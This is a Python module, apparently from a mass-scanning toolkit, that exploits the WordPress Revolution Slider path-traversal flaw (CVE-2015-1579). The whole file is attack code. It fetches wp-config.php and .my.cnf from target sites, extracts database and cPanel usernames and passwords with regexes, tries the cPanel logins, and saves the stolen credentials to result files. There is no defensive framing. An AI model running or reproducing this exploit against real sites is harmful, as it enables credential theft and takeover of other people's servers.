# coding=utf-8
import requests, re
import printModule
import cpanel

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Attack(site):
    try:
        agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        G = requests.get('http://' + site + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf',
                         timeout=7, headers=agent)
        if 'user=' in str(G.content):
            Username = re.findall('user=(.*)', str(G.content))[0]
            Password = re.findall('password="(.*)"', str(G.content))[0]
            with open('result/Cpanel.txt', 'a') as XW:
                XW.write(' {}/cpanel:{},{}\n'.format(site, Username, Password))
        else:
            pass
    except:
        pass

def Exploit(site):
    try:
        Exp = 'http://' + site + \
              '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
        GetConfig = requests.get(Exp, timeout=10, headers=Headers)
        if 'DB_PASSWORD' in str(GetConfig.content):
            Attack(site)
            with open('result/Config_results.txt', 'a') as ww:
                ww.write('Full Config Path  : ' + Exp + '\n')
            try:
                #define('DB_USER', 'admin_soljica2');
                Gethost = re.findall("'DB_HOST', '(.*)'", str(GetConfig.content))
                Getuser = re.findall("'DB_USER', '(.*)'", str(GetConfig.content))
                Getpass = re.findall("'DB_PASSWORD', '(.*)'", str(GetConfig.content))
                Getdb = re.findall("'DB_NAME', '(.*)'", str(GetConfig.content))
                cpanel.Check(site, Getuser[0], Getpass[0])

                with open('result/Config_results.txt', 'a') as ww:
                    ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                             '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                 0] + '\n---------------------\n')
                return printModule.returnYes(site, 'CVE-2015-1579', 'Revslider Config', 'Wordpress')
            except:
                return printModule.returnYes(site, 'CVE-2015-1579', 'Revslider Config', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2015-1579', 'Revslider Config', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2015-1579', 'Revslider Config', 'Wordpress')

